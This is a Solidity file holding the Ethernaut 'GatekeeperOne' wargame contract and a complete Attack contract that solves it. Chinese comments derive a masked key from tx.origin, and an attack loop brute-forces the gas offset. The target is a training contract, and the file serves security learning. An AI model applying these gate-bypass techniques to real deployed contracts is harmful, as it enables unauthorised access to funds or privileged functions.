// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract Attack{

  /**
  uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
  uint32(uint64(_gateKey)) != uint64(_gateKey)
  uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
    8位 = 一个字节 ＝2个16进制字符 = oxFF =ox 11111111   
    2进制 8 位  XXXXXXXX  表示 0~255 
    uint32 类型的取值范围是 0 到 2 ** 32-1 = 有4个字节 0xFF FF FF FF 
    uint256    256位  除以8  => 32个字节   一个 slot 就是32个字节  
    address 是 0x0Dd01A495A499e642a0B7d45CCa54522034fBa2C  20个字节  

  转换为一个更小的类型，高位将被截断
  key = 0x xx xx xx xx xx xx xx xx   8个字节  16个符号
  key.slice[32,64] = key.slice[48,64]  也就是说 key.slice[32,48]= 0x 00 00  
  key = 0x xx xx xx xx 00 00 xx xx
  key.slice[32,64] != key.slice[1,64]  也就是说 key.slice[1,32] 不能全为0  得有一个1
  key = 0x xx xx xx xx 00 00 xx xx
  key.slice[32,64] = tx.origin.slice[1,16]   也就是说 key.slice[49, 64] = 0x ff ff 
  key = 0x xx xx xx xx 00 00 ff ff
  按照条件2 前面一半的字节只需要不全为0 即可 
  key = 0x f0 00 00 00 00 00 ff ff
        0x ff 00 00 00 00 00 ff ff
      0x 00 f0 00 00 00 00 ff ff  都是可以的  

  参考: 
     https://github.com/RubensGitHub/BlockchainSecurityLearningMaterial/blob/main/ethernaut-solutions/13GateKeeperExploit.sol
     https://www.youtube.com/watch?v=AUQxXJiqLF4&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz&index=16 
  */    
    bytes8 public key;
    bytes encodedParams;
    address public addr; 

    constructor(address _addr)  {
        bytes8 left = bytes8(uint64(uint160(tx.origin)));
        key = left & 0xFF0000000000FFFF;     // 前面4个字节 16个字符只要不全是0即可 
        encodedParams = abi.encodeWithSignature("enter(bytes8)", key);
        addr = _addr;
    }

    function pass_gateOne() public returns (bool){
        return uint32(uint64(key)) == uint16(uint64(key));
    }

    function pass_gateTwo() public returns (bool){
        return uint32(uint64(key)) != uint64(key);
    }

    function pass_gateThree() public returns (bool){
        return uint32(uint64(key)) == uint16(uint160(tx.origin));
    }

    // sure u can call this advance to check 
    function passAll() public returns (bool) {
        return pass_gateOne() && pass_gateTwo() && pass_gateThree();
    }
    
    // result is around 210  so  st=150, et=270 
    function attack(uint st, uint et) public {
      for(uint i=st; i< et; i++){
        (bool sent , bytes memory data) = addr.call{gas: i + 8191 * 3}(encodedParams);
        if(sent) {
           break;
        }
      }
    }   
} 
